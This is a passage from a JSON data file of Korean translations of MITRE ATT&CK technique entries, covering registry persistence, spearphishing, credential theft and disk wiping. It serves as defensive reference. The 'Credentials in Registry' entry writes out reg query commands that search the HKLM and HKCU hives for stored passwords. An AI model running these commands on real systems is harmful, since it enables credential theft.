단계로 사용될 수 있습니다. 예를 들어, 토큰이 피해자의 주요 이메일에 대한 접근을 허용하면, 적대자는 비밀번호 재설정 절차를 유도하여 목표가 구독하는 다른 모든 서비스에 대한 접근을 확장할 수 있습니다. 토큰을 통한 직접 API 접근은 두 번째 인증 요소의 효과를 무효화하며, 비밀번호 변경과 같은 직관적인 대응 조치에 면역력을 가질 수 있습니다. API 채널을 통한 접근 남용은 서비스 제공자 측에서도 감지하기 어려울 수 있으며, 접근이 여전히 합법적인 작업 흐름과 잘 맞을 수 있습니다.",
    "external_id": "T1527",
    "modified": "2023-11-02T15:39:10.534Z",
    "translated": true
  },
  {
    "title": "Screensaver",
    "description": "스크린세이버는 사용자의 비활동 시간 설정 후 실행되는 프로그램으로, .scr 파일 확장자를 가진 휴대용 실행 파일(PE)로 구성되어 있습니다. Windows 스크린세이버 응용 프로그램인 scrnsave.scr는 <code>C:\\Windows\\System32\\</code>와 64비트 Windows 시스템의 <code>C:\\Windows\\sysWOW64\\</code>에 위치하며, 기본 Windows 설치에 포함된 스크린세이버와 함께 제공됩니다.\n\n다음 스크린세이버 설정은 레지스트리(<code>HKCU\\Control Panel\\Desktop\\</code>)에 저장되며, 지속성을 유지하기 위해 조작될 수 있습니다:\n\n* <code>SCRNSAVE.exe</code> - 악성 PE 경로로 설정\n* <code>ScreenSaveActive</code> - 스크린세이버를 활성화하기 위해 '1'로 설정\n* <code>ScreenSaverIsSecure</code> - 잠금을 해제하기 위해 비밀번호를 요구하지 않도록 '0'으로 설정\n* <code>ScreenSaveTimeout</code> - 스크린세이버가 실행되기 전에 사용자의 비활동 시간 초과를 설정\n\n적대자들은 특정 시간만큼 사용자가 비활동할 경우 악성 코드를 실행하기 위해 스크린세이버 설정을 사용할 수 있습니다.",
    "external_id": "T1180",
    "modified": "2020-01-24T13:51:47.990Z",
    "translated": true
  },
  {
    "title": "Spearphishing Link",
    "description": "적대자들은 피해 시스템에 접근하기 위해 악성 링크가 포함된 스피어피싱 이메일을 보낼 수 있습니다. 링크가 포함된 스피어피싱은 스피어피싱의 특정 변형으로, 이메일 자체에 악성 파일을 첨부하는 대신 이메일에 포함된 악성 소프트웨어를 다운로드하기 위해 링크를 사용하는 방식이기 때문에 다른 형태의 스피어피싱과 다릅니다. 이는 이메일 첨부파일을 검사할 수 있는 방어를 피하기 위해 사용됩니다. 스피어피싱은 또한 신뢰할 수 있는 출처인 것처럼 가장하는 사회 공학 기법을 포함할 수 있습니다.\n\n모든 형태의 스피어피싱은 특정 개인, 회사 또는 산업을 목표로 한 전자적 사회 공학입니다. 이 경우, 악성 이메일은 링크를 포함하고 있습니다. 일반적으로 이러한 링크는 사회 공학적 텍스트와 함께 제공되며 사용자가 직접 클릭하거나 URL을 복사하여 브라우저에 붙여넣도록 요구합니다. 방문한 웹사이트는 취약점을 이용해 웹 브라우저를 손상시킬 수 있으며, 사용자는 이메일에 따라 응용 프로그램, 문서, 압축 파일 또는 실행 파일을 다운로드하라는 메시지를 받을 수 있습니다.\n\n적대자들은 또한 이메일 리더와 직접 상호작용하도록 설계된 링크를 포함할 수 있으며, 여기에는 최종 시스템을 직접 공격하기 위한 삽입된 이미지가 포함됩니다. 또한, 적대자들은 정상적인 웹사이트를 모방하기 위해 특별 문자를 악용하여 보이는 것처럼 무해한 링크를 사용할 수 있습니다. URL은 URL 스키마의 특수성을 이용해 혼란스럽게 만들 수도 있습니다.\n\n적대자들은 또한 링크를 사용하여 동의 피싱을 수행할 수 있으며, 이는 일반적으로 사용자가 수락할 때 악성 응용 프로그램에 대한 권한/접속을 제공하는 OAuth 2.0 요청 URL과 관련이 있습니다. 이러한 도용된 액세스 토큰은 적대자가 사용자 대신 API 호출을 통해 다양한 작업을 수행할 수 있게 합니다.\n\n적대자들은 또한 스피어피싱 링크를 사용하여 피해 환경에 즉각적으로 접근할 수 있는 애플리케이션 액세스 토큰을 탈취할 수 있습니다. 예를 들어, 사용자는 “동의 피싱”을 통해 악성 OAuth 2.0 요청 URL을 통해 적대자에게 권한을 부여하도록 유도될 수 있습니다.\n\n유사하게, 악성 링크는 OAuth 2.0 장치 권한 부여 흐름과 같은 장치 기반 인증을 목표로 할 수 있으며, 이는 일반적으로 UI/브라우저 없이 장치를 인증하는 데 사용됩니다. “장치 코드 피싱”이라고 알려진 이 방식에서 적대자는 피해자를 악성 권한 부여 페이지로 안내하는 링크를 전송하여 사용자가 코드/자격 증명을 입력하도록 속여 장치 토큰을 생성하게 할 수 있습니다.",
    "external_id": "T1566.002",
    "modified": "2024-10-15T16:06:32.591Z",
    "translated": true
  },
  {
    "title": "Startup Items",
    "description": "애플의 문서에 따르면, 시작 항목은 부팅 프로세스의 최종 단계에서 실행되며, 셸 스크립트 또는 기타 실행 가능한 파일과 시스템이 모든 시작 항목의 실행 순서를 결정하는 데 사용하는 구성 정보가 포함되어 있습니다. 이는 기술적으로 더 이상 사용되지 않는 버전이며, Launch Daemons에 의해 대체되었으므로, 적절한 폴더는 기본적으로 시스템에 존재하지 않을 수 있지만, macOS Sierra에서는 기본적으로 존재하는 것으로 보입니다. 시작 항목은 실행 파일과 구성 속성 리스트(plist), 즉 StartupParameters.plist가 최상위 디렉터리에 위치하는 디렉터리입니다.\n\n적대자는 StartItems 디렉터리에서 적절한 폴더/파일을 생성하여 자신의 지속성 메커니즘을 등록할 수 있습니다. 또한, StartupItems는 macOS의 부팅 단계에서 실행되므로 루트로 실행됩니다. 만약 적대자가 기존의 시작 항목을 수정할 수 있다면, 권한 상승도 가능해질 것입니다.",
    "external_id": "T1165",
    "modified": "2020-01-15T18:02:49.891Z",
    "translated": true
  },
  {
    "title": "Disabling Security Tools",
    "description": "적대자는 도구 및 활동의 가능한 탐지를 피하기 위해 보안 도구를 비활성화할 수 있습니다. 이는 보안 소프트웨어나 이벤트 로깅 프로세스를 종료하거나, 도구가 실행 시 시작되지 않도록 레지스트리 키를 삭제하거나, 보안 스캔이나 이벤트 보고를 방해하는 다른 방법을 사용하는 형태일 수 있습니다.",
    "external_id": "T1089",
    "modified": "2020-02-21T20:35:48.979Z",
    "translated": true
  },
  {
    "title": "Disk Structure Wipe",
    "description": "적대자는 시스템 부팅에 필요한 하드 드라이브의 디스크 데이터 구조를 손상시키거나 삭제할 수 있으며, 특정 중요한 시스템과 네트워크 내의 많은 시스템을 타겟으로 삼아 시스템 및 네트워크 자원의 가용성을 방해할 수 있습니다.\n\n적대자는 마스터 부트 레코드(MBR)나 파티션 테이블과 같은 구조에 있는 중요한 데이터를 덮어씌움으로써 시스템이 부팅할 수 없도록 만들려고 시도할 수 있습니다. 디스크 구조에 포함된 데이터에는 운영 체제를 로드하기 위한 초기 실행 코드나 디스크의 파일 시스템 파티션 위치가 포함될 수 있습니다. 이 정보가 없으면 컴퓨터는 부팅 프로세스 중에 운영 체제를 로드할 수 없어, 컴퓨터가 사용할 수 없게 됩니다. 디스크 구조 삭제는 단독으로 수행될 수도 있고, 모든 디스크 섹터가 삭제될 경우 디스크 콘텐츠 삭제와 함께 수행될 수도 있습니다.\n\n대상 조직에 대한 영향을 극대화하기 위해, 디스크 구조를 파괴하기 위해 설계된 멀웨어는 네트워크를 통해 전파되기 위해 웜처럼 작동할 수 있는 기능을 가질 수 있으며, 이는 다른 기술을 활용하여 이루어질 수 있습니다.",
    "external_id": "T1487",
    "modified": "2020-02-20T22:11:00.106Z",
    "translated": true
  },
  {
    "title": "Credentials in Registry",
    "description": "Windows 레지스트리는 시스템이나 다른 프로그램에서 사용할 수 있는 구성 정보를 저장합니다. 적대자는 레지스트리를 조회하여 다른 프로그램이나 서비스에서 사용하기 위해 저장된 자격 증명과 비밀번호를 찾을 수 있습니다. 때때로 이러한 자격 증명은 자동 로그온에 사용됩니다. \n\n비밀번호 정보와 관련된 레지스트리 키를 찾기 위한 명령어 예시: \n\n* 로컬 머신 하이브: reg query HKLM /f password /t REG_SZ /s\n* 현재 사용자 하이브: reg query HKCU /f password /t REG_SZ /s",
    "external_id": "T1214",
    "modified": "2020-02-04T12:59:37.464Z",
    "translated": true
  },
  {
    "title": "Botnet",
    "description": "적대 세력은 타겟팅 중에 사용할 수 있는 손상된 시스템의 네트워크를 구매, 임대 또는 대여할 수 있습니다. 봇넷은 조정된 작업을 수행하도록 지시할 수 있는 손상된 시스템의 네트워크입니다. 적대 세력은 부터/스트레서 서비스에서 기존 봇넷을 사용하기 위해 구독을 구매할 수 있습니다. 봇넷을 사용할 수 있는 상황에서, 적대 세력은 대규모 피싱이나 분산 서비스 거부(DDoS)와 같은 후속 활동을 수행할 수 있습니다.",
    "external_id": "T1583.005",
    "modified": "2021-04-15T02:49:14.664Z",
    "translated": true
  },
  {
    "title": "AppInit DLLs",
    "description": "레지스트리 키 <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> 또는 <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>의 AppInit_DLLs 값에 지정된 동적 링크 라이브러리(DLL)는 user32.dll에 의해 user32.dll을 로드하는 모든 프로세스에 로드됩니다. 실제로 이는 거의 모든 프로그램이며, user32.dll은 매우 일반적인 라이브러리입니다. 이러한 값은 악성 DLL이 컴퓨터의 별도 프로세스에서 로드되고 실행되도록 하여 지속성과 권한 상승을 얻기 위해 악용될 수 있습니다. \n\nWindows 8 및 이후 버전에서는 보안 부팅이 활성화되어 있을 때 AppInit DLL 기능이 비활성화됩니다.",
    "external_id": "T1103",
    "modified": "2020-11-10T18:29:30.379Z",
    "translated": true
  },
  {
    "title": "Application Deployment Software",
    "description": "적대자는 기업 관리자들이 사용하는 애플리케이션 배포 시스템을 통해 네트워크 내의 시스템에 악성 소프트웨어를 배포할 수 있습니다. 이 작업에 필요한 권한은 시스템 구성에 따라 다르며, 배포 서버에 직접 접근할 경우 로컬 자격 증명이 충분할 수 있거나 특정 도메인 자격 증명이 필요할 수 있습니다. 그러나 시스템에 로그인을 하거나 소프트웨어 배포를 수행하기 위해 관리자 계정이 필요할 수 있습니다.\n\n네트워크 전반 또는 기업 전반의 소프트웨어 배포 시스템에 대한 접근은 적대자가 그러한 시스템에 연결된 모든 시스템에서 원격 코드 실행을 가능하게 합니다. 이 접근은 측면 이동을 통해 시스템으로 이동하거나 정보를 수집하거나, 모든 엔드포인트의 하드 드라이브를 지우는 것과 같은 특정 효과를 일으키는 데 사용될 수 있습니다.",
    "external_id": "T1017",
    "modified": "2020-03-23T15:40:50.965Z",
    "translated": true
  },
  {
    "title": "Code Signing Certificates",
    "description": "적대자는 작전을 위해 사용할 수 있는 자체 서명된 코드 서명 인증서를 생성할 수 있습니다. 코드 서명은 소프트웨어 저자를 확인하고 코드가 변경되거나 손상되지 않았음을 보장하기 위해 실행 파일 및 스크립트에 디지털 서명을 하는 과정입니다. 코드 서명은 개발자로부터 프로그램에 대한 진위 수준과 프로그램이 변조되지 않았다는 보증을 제공합니다. 사용자 및/또는 보안 도구는 인증서를 발급한 사람이 누구인지 또는 저자가 누구인지 모를지라도 서명된 코드 조각을 서명되지 않은 코드 조각보다 더 신뢰할 수 있습니다.",
    "external_id": "T1587.002",
    "modified": "2021-10-17T16:07:08.549Z",
    "translated": true
  },
  {
    "title": "Login Item",
    "description": "MacOS는 사용자가 로그인할 때 실행할 특정 응용 프로그램 목록을 제공하는 옵션을 제공합니다. 이러한 응용 프로그램은 로그인한 사용자의 컨텍스트에서 실행되며 사용자가 로그인할 때마다 시작됩니다. 서비스 관리 프레임워크를 사용하여 설치된 로그인 항목은 시스템 환경설정에서 볼 수 없으며 이를 생성한 응용 프로그램에 의해만 제거될 수 있습니다. 사용자는 시스템 환경설정에서도 볼 수 있는 공유 파일 목록을 사용하여 설치된 로그인 항목을 직접 제어할 수 있습니다. 이러한 로그인 항목은 사용자의 <code>~/Library/Preferences/</code> 디렉토리에 <code>com.apple.loginitems.plist</code>라는 plist 파일로 저장됩니다. 이 응용 프로그램 중 일부는 사용자에게 보이는 다이얼로그를 열 수 있지만, 모두 그렇지 않을 수 있으며 '숨기기' 옵션이 있습니다. 만약 공격자가 자신의 로그인 항목을 등록하거나 기존 항목을 수정할 수 있다면, 사용자가 로그인할 때마다 지속성 메커니즘으로 그들의 코드를 실행하는 데 사용할 수 있습니다. API 메서드 <code> SMLoginItemSetEnabled </code>를 사용하여 로그인 항목을 설정할 수 있지만, [AppleScript](https://attack.mitre.org/techniques/T1155)와 같은 스크립팅 언어도 이를 수행할 수 있습니다.",
    "external_id": "T1162",
    "modified": "2022-04-22T18:50:50.483Z",
    "translated": true
  },
  {
    "title": "Service Registry Permissions Weakness",
    "description": "Windows는 로컬 서비스 구성 정보를 레지스트리의 <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code> 아래에 저장합니다. 서비스의 레지스트리 키에 저장된 정보는 서비스의 실행 매개변수를 수정하기 위해 서비스 컨트롤러, sc.exe, PowerShell, 또는 Reg와 같은 도구를 통해 조작될 수 있습니다. 레지스트리 키에 대한 접근은 접근 제어 목록 및 권한을 통해 제어됩니다.\n\n사용자 및 그룹에 대한 권한이 적절하게 설정되지 않고 서비스의 레지스트리 키에 대한 접근을 허용하면, 공격자는 서비스의 binPath/ImagePath를 자신이 제어하는 다른 실행 파일로 변경할 수 있습니다. 서비스가 시작되거나 다시 시작될 때, 공격자가 제어하는 프로그램이 실행되어 공격자는 지속성을 확보하거나 서비스가 실행되도록 설정된 계정 컨텍스트(로컬/도메인 계정, SYSTEM, LocalService, 또는 NetworkService)에서 권한 상승을 얻을 수 있습니다.\n\n공격자는 또한 서비스 실패 매개변수와 관련된 레지스트리 키(예: <code>FailureCommand</code>)를 변경하여 서비스가 실패하거나 의도적으로 손상될 때마다 상승된 컨텍스트에서 실행될 수 있습니다.",
    "external_id": "T1058",
    "modified": "2020-03-19T15:12:13.034Z",
    "translated": true
  },
  {
    "title": "Custom Cryptographic Protocol",
    "description": "상대방은 명령 및 제어 트래픽을 숨기기 위해 맞춤형 암호화 프로토콜이나 알고리즘을 사용할 수 있습니다. 평문과 고정 키를 XOR하는 간단한 방식은 매우 약한 암호문을 생성합니다.\n\n맞춤형 암호화 방식은 정교함이 다를 수 있습니다. 악성코드 샘플에 대한 분석 및 리버스 엔지니어링만으로도 사용된 알고리즘과 암호화 키를 발견할 수 있습니다.\n\n일부 상대방은 잘 알려진 암호화 알고리즘의 자체 버전을 구현하려고 시도할 수도 있으며, 이는 알려진 구현 라이브러리를 사용하는 대신 기인할 수 있으며, 의도하지 않은 오류를 초래할 수 있습니다.",
    "external_id": "T1024",
    "modified": "2021-07-20T21:57:36.046Z",
    "translated": true
  },
  {
    "title": "Revert Cloud Instance",
    "description": "적대자는 악의적인 활동을 수행한 후 클라우드 인스턴스에서 변경된 사항을 되돌려 탐지를 피하고 자신의 존재에 대한 증거를 제거할 수 있습니다. 클라우드 기반 인프라와 같은 고도로 가상화된 환경에서는 클라우드 관리 대시보드나 클라우드 API를 통해 가상 머신(VM)이나 데이터 저장소 스냅샷을 복원함으로써 이를 달성할 수 있습니다.\n\n이 기술의 또 다른 변형은 컴퓨트 인스턴스에 연결된 임시 저장소를 활용하는 것입니다. 대부분의 클라우드 제공업체는 영구 저장, 로컬 저장 및/또는 임시 저장을 포함한 다양한 유형의 저장소를 제공하며, 임시 저장소 유형은 VM을 중지/재시작할 때 종종 초기화됩니다.",
    "external_id": "T1536",
    "modified": "2021-03-08T10:33:01.527Z",
    "translated": true
  },
  {
    "title": "Cloud Accounts",
    "description": "적대자들은 공격 중에 사용할 수 있는 클라우드 계정을 타협할 수 있습니다. 타협된 클라우드 계정을 사용하여 그들의 작업을 진행시킬 수 있으며, 클라우드 저장 서비스들을 활용할 수 있습니다. 클라우드 계정은 가상 사설 서버 또는 서버리스 인프라를 확보하는 데에도 사용될 수 있습니다. 또한, 클라우드 기반 메시징 서비스가 스팸이나 피싱에 활용될 수 있습니다. 클라우드 계정을 타협하는 것은 적대자들이 자신의 서버를 관리하지 않고도 정교한 기능을 개발할 수 있게 합니다.\n\n클라우드 계정을 타협하는 방법에는 정보 피싱을 통한 자격 증명 수집, 제3자 사이트에서 자격 증명 구매, 비밀번호 스프레이 공격 수행, 또는 애플리케이션 접근 토큰을 훔치려는 시도 등이 있습니다. 클라우드 계정을 타협하기 전에 적대자들은 어떤 계정을 타협할지를 결정하기 위해 정찰 활동을 수행할 수 있습니다. 경우에 따라 적대자들은 서비스 제공업체와 고객 간의 신뢰 관계를 활용할 목적으로 특권 서비스 제공업체 계정을 목표로 할 수 있습니다.",
    "external_id": "T1586.003",
    "modified": "2024-10-16T21:26:36.312Z",
    "translated": true
  },
  {
    "title": "Email Accounts",
    "description": "적대자들은 타겟팅에 사용될 수 있는 이메일 계정을 손상시킬 수 있습니다. 손상된 이메일 계정은 정보 피싱, 피싱 또는 대규모 스팸 이메일 캠페인과 같은 작업을 진행하는 데 사용될 수 있습니다. 손상된 이메일 계정을 가진 기존 인물을 이용하면 피해자와 관계가 있거나 손상된 인물에 대해 알고 있는 경우, 잠재적 피해자에게 신뢰를 형성할 수 있습니다. 손상된 이메일 계정은 인프라를 획득하는 데에도 사용될 수 있습니다.\n\n이메일 계정을 손상시키기 위한 다양한 방법이 존재하며, 정보 피싱을 통해 자격 증명을 수집하거나, 제3자 사이트에서 자격 증명을 구매하거나, 자격 증명을 무차별 대입하여 얻거나, 직원, 공급업체 또는 비즈니스 파트너에게 자격 증명 접근 권한을 대가로 지불하는 방법이 있습니다. 이메일 계정을 손상시키기 전에 적대자들은 어떤 계정을 손상시킬지 결정하기 위해 정찰 활동을 수행할 수 있습니다. 그들은 잘 알려진 이메일 계정이나 악성 스팸 또는 피싱 이메일이 평판 기반 이메일 필터링 규칙을 피할 수 있는 도메인을 겨냥할 수 있습니다.\n\n적대자들은 손상된 이메일 계정을 사용하여 관심 있는 대상과의 기존 이메일 스레드를 해킹할 수 있습니다.",
    "external_id": "T1586.002",
    "modified": "2023-04-11T01:07:48.218Z",
    "translated": true
  },
  {
    "title": "Multilayer Encryption",
    "description": "적대자는 여러 겹의 암호화를 사용하여 C2 통신을 수행하며, 일반적으로 (그러나 반드시 그렇지는 않지는 않음) HTTPS 또는 SMTPS와 같은 프로토콜 암호화 체계 내에 사용자 지정 암호화 체계를 터널링합니다.",
    "external_id": "T1079",
    "modified": "2020-03-24T14:09:11.589Z",
    "translated": true
  },
  {
    "title": "Bash History",
    "description": "Bash는 사용자가 명령줄에서 입력한 명령을 \"history\" 유틸리티로 추적합니다. 사용자가 로그아웃하면 이 히스토리는 사용자의 <code>.bash_history</code> 파일로 플러시됩니다. 각 사용자의 이 파일은 동일한 위치에 존재합니다: <code>~/.bash_history</code>. 일반적으로 이 파일은 사용자의 마지막 500개 명령을 기록합니다. 사용자는 종종 명령줄에서 프로그램의 매개변수로 사용자 이름과 암호를 입력하며, 이 정보는 로그아웃할 때 이 파일에 저장됩니다. 공격자는 이 파일을 살펴봐서 잠재적인 자격 증명을 유출할 수 있습니다.",
    "external_id": "T1139",
    "modified": "2020-02-04T13:03:03.354Z",
    "translated": true
  },
  {
    "title": "Credentials from Web Browsers",
    "description": "적대자는 특정 웹 브라우저에 맞춰진 파일을 읽음으로써 웹 브라우저에서 자격 증명을 획득할 수 있습니다.\n\n웹 브라우저는 일반적으로 웹사이트 사용자 이름과 비밀번호와 같은 자격 증명을 저장하여 사용자가 이후에 수동으로 입력할 필요가 없도록 합니다. 대부분의 웹 브라우저는 자격 증명을 암호화된 형식으로 자격 증명 저장소에 저장하지만, 웹 브라우저에서 평문 자격 증명을 추출하는 방법이 존재합니다.\n\n예를 들어, Windows 시스템에서는 Google Chrome에서 암호화된 자격 증명을 데이터베이스 파일을 읽고 SQL 쿼리를 실행하여 얻을 수 있습니다. 그런 다음 암호화된 자격 증명을 Windows API 함수에 전달하여 평문 비밀번호를 얻을 수 있습니다. 이 함수는 피해자의 캐시된 로그인 자격 증명을 복호화 키로 사용합니다.\n\n적대자는 FireFox, Safari, Edge와 같은 일반 웹 브라우저에 대해서도 유사한 절차를 실행했습니다.\n\n또한 적대자는 웹 브라우저 프로세스 메모리에서 자격 증명과 일반적으로 일치하는 패턴을 검색함으로써 자격 증명을 획득할 수도 있습니다.\n\n웹 브라우저에서 자격 증명을 획득한 후, 적대자는 다른 시스템 및/또는 계정에서 자격 증명을 재사용하려고 시도하여 접근 권한을 확장할 수 있습니다. 이로 인해 웹 브라우저에서 얻은 자격 증명이 특권 계정(예: 도메인 관리자)과 겹치는 경우 적대자의 목표가 상당히 진전될 수 있습니다.",
    "external_id": "T1503",
    "modified": "2020-11-17T16:03:55.549Z",
    "translated": true
  },
  {
    "title": "Source",
    "description": "이 기술은 더 이상 사용되어서는 안 됩니다.\n\n`source` 명령은 현재 쉘에 함수를 로드하거나 현재 맥락에서 파일을 실행합니다. 이 내장 명령은 두 가지 방법으로 실행할 수 있습니다: `source /path/to/filename [arguments]` 또는 `. /path/to/filename [arguments]`. \".\" 다음에 공백이 있음을 주의하세요. 공백이 없으면 새로운 쉘이 생성되어 프로그램이 실행되고, 현재 맥락에서 프로그램이 실행되지 않습니다. 이는 특정 기능이나 함수를 쉘에서 사용할 수 있게 하거나 특정 쉘의 환경을 업데이트하는 데 자주 사용됩니다. \n\n적대자는 이 기능을 악용하여 프로그램을 실행할 수 있습니다. 이 기술로 실행된 파일은 사전에 실행 가능으로 표시되어 있을 필요가 없습니다.",
    "external_id": "T1153",
    "modified": "2020-03-30T13:40:14.512Z",
    "translated": true
  },
  {
    "title": "DLL Search Order Hijacking",
    "description": "Windows 시스템은 프로그램에 로드할 DLL을 찾기 위해 공통된 방법을 사용합니다. 공격자는 Windows DLL 검색 순서와 DLL을 모호하게 지정하는 프로그램을 이용하여 권한 상승과 지속성을 얻을 수 있습니다.\n\n공격자는 DLL 사전 로딩, 즉 바이너리 플랜팅 공격을 수행할 수 있으며, 이는 모호하게 지정된 DLL과 동일한 이름을 가진 악성 DLL을 합법적인 DLL보다 먼저 Windows가 검색하는 위치에 배치하는 것입니다. 이 위치는 종종 프로그램의 현재 작업 디렉토리입니다. 원격 DLL 사전 로딩 공격은 프로그램이 DLL을 로드하기 전에 현재 디렉토리를 웹 공유와 같은 원격 위치로 설정할 때 발생합니다. 공격자는 이러한 동작을 이용해 프로그램이 악성 DLL을 로드하도록 할 수 있습니다.\n\n공격자는 또한 프로그램이 DLL을 로드하는 방식 자체를 직접 수정할 수 있습니다. 기존 DLL을 교체하거나 .manifest 또는 .local 리디렉션 파일, 디렉토리 또는 결합 지점을 수정하여 프로그램이 지속성 또는 권한 상승을 유지하기 위해 다른 DLL을 로드하도록 할 수 있습니다.\n\n검색 순서에 취약한 프로그램이 높은 권한 수준으로 실행되도록 구성되어 있는 경우, 공격자가 제어하는 DLL이 로드되면 그 DLL도 높은 수준에서 실행됩니다. 이 경우, 이 기술은 사용자에서 관리자 또는 SYSTEM으로, 또는 관리자인 경우 SYSTEM으로 권한 상승에 사용될 수 있습니다.\n\n경로 하이재킹의 희생양이 되는 프로그램은 악성 DLL이 그들이 대체할 의도였던 합법적인 DLL도 로드도록 구성되어 있을 수 있기 때문에 정상적으로 작동하는 것처럼 보일 수 있습니다.",
    "external_id": "T1038",
    "modified": "2020-03-26T14:49:47.091Z",
    "translated": true
  },
  {
    "title": "New Service",
    "description": "운영 체제가 부팅될 때, 백그라운드 시스템 기능을 수행하는 서비스라는 프로그램 또는 애플리케이션을 시작할 수 있습니다. 서비스의 구성 정보, 즉 서비스 실행 파일의 경로는 Windows 레지스트리에 저장됩니다.\n\n적대자는 서비스를 새로 설치할 수 있으며, 이를 통해 시작 시 실행되도록 구성할 수 있습니다. 이는 서비스를 조작하는 유틸리티를 사용하거나 레지스트리를 직접 수정함으로써 가능합니다. 서비스 이름은 관련 운영 체제나 무해한 소프트웨어의 이름을 사용하여 위장할 수 있습니다. 서비스는 관리자 권한으로 생성되지만 SYSTEM 권한으로 실행되므로, 적대자는 서비스를 사용하여 관리자 권한에서 SYSTEM 권한으로 상승시킬 수도 있습니다. 적대자는 서비스 실행을 통해 서비스를 직접 시작할 수도 있습니다.",
    "external_id": "T1050",
    "modified": "2020-03-17T16:21:36.413Z",
    "translated": true
  },
  {
    "title": "Standard Cryptographic Protocol",
    "description": "적대자는 통신 프로토콜이 제공하는 기본적인 보호에 의존하기보다는 명시적으로 알려진 암호화 알고리즘을 사용하여 명령 및 제어 트래픽을 숨길 수 있습니다. 보안 알고리즘을 사용하더라도 이러한 구현은 필요한 비밀 키가 악성 코드 샘플이나 구성 파일 내에 인코딩되거나 생성될 경우 역공학에 취약할 수 있습니다.",
    "external_id": "T1032",
    "modified": "2020-03-21T00:43:01.387Z",
    "translated": true
  },
  {
    "title": "Hypervisor",
    "description": "이 기술은 더 이상 사용되지 않으며 폐기되었습니다.\n\n타입-1 하이퍼바이저는 게스트 운영 체제와 시스템 하드웨어 사이에 위치하는 소프트웨어 계층입니다. 이는 운영 체제에 가상 실행 환경을 제공합니다. 일반적인 하이퍼바이저의 예로는 Xen이 있습니다. 타입-1 하이퍼바이저는 운영 체제 아래의 수준에서 작동하며 게스트 운영 체제에서 자신의 존재를 숨기기 위해 루트킷 기능으로 설계될 수 있습니다. 이러한 악의적인 하이퍼바이저는 시스템의 중단을 통해 지속적으로 존재할 수 있도록 사용될 수 있습니다.",
    "external_id": "T1062",
    "modified": "2020-03-30T13:44:04.712Z",
    "translated": true
  },
  {
    "title": "AppCert DLLs",
    "description": "<code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> 아래의 AppCertDLLs 레지스트리 키에 지정된 동적 링크 라이브러리(DLL)는 CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW 또는 WinExec와 같은 널리 사용되는 응용 프로그램 프로그래밍 인터페이스(API) 함수를 호출하는 모든 프로세스에 로드됩니다.\n\n[프로세스 주입]과 유사하게, 이 값은 악성 DLL이 컴퓨터의 별도 프로세스 컨텍스트에서 로드되고 실행되도록 하여 지속성과 권한 상승을 얻기 위해 악용될 수 있습니다.",
    "external_id": "T1182",
    "modified": "2020-11-10T18:29:30.350Z",
    "translated": true
  },
  {
    "title": "Winlogon Helper DLL",
    "description": "Winlogon.exe는 로그온/로그오프 시의 작업과 Ctrl-Alt-Delete로 트리거되는 보안 주의 시퀀스(SAS)를 담당하는 Windows 구성 요소입니다. `<code>HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>`와 `<code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>`의 레지스트리 항목은 Winlogon을 지원하는 추가 보조 프로그램과 기능을 관리하는 데 사용됩니다.\n\n악의적인 수정이 이러한 레지스트리 키에 이루어질 경우, Winlogon이 악성 DLL 및/또는 실행 파일을 로드하고 실행하게 만들 수 있습니다. 특히, 다음 하위 키들이 악용될 가능성이 있는 것으로 알려져 있습니다:\n\n* Winlogon\\Notify - Winlogon 이벤트를 처리하는 알림 패키지 DLL을 가리킴\n* Winlogon\\Userinit - 사용자가 로그온할 때 실행되는 사용자 초기화 프로그램인 userinit.exe를 가리킴\n* Winlogon\\Shell - 사용자가 로그온할 때 실행되는 시스템 쉘인 explorer.exe를 가리킴\n\n적대적 요소들은 이러한 기능을 활용하여 악성 코드를 반복적으로 실행하고 지속성을 확보할 수 있습니다.",
    "external_id": "T1004",
    "modified": "2020-01-24T17:07:19.762Z",
    "translated": true
  },
  {
    "title": "Binary Padding",
    "description": "적대자는 바이너리 패딩을 사용하여 쓸모없는 데이터를 추가하고 맬웨어의 디스크 상 표현을 변경할 수 있지만, 바이너리의 기능이나 동작에는 영향을 미치지 않습니다. 이는 종종 파일 크기 제한으로 인해 일부 보안 도구가 처리할 수 있는 범위를 초과하여 바이너리의 크기를 증가시킵니다.\n\n바이너리 패딩은 파일의 체크섬을 효과적으로 변경하며 해시 기반 블랙리스트 및 정적 안티바이러스 서명을 회피하는 데에도 사용될 수 있습니다. 사용되는 패딩은 일반적으로 쓸모 없는 데이터를 생성하는 함수에 의해 생성된 후 맬웨어의 끝에 추가되거나 섹션에 적용됩니다. 파일 크기를 늘리면 대형 파일 스캔을 위해 설계되거나 구성되지 않은 특정 도구 및 탐지 능력의 효과가 감소할 수 있습니다. 또한 분석을 위해 수집될 가능성을 줄일 수 있습니다. VirusTotal과 같은 공용 파일 스캐닝 서비스는 분석을 위해 업로드된 파일의 최대 크기를 제한합니다.",
    "external_id": "T1009",
    "modified": "2020-09-17T18:25:33.796Z",
    "translated": true
  },
  {
    "title": "Remote Desktop Protocol",
